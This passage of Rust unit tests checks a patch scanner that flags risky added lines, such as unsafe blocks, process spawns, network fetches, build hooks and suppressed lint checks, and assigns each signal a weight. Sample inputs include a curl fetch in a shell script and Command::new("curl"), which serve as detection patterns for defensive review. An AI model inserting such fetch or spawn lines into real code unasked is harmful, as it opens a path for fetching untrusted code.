        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
}
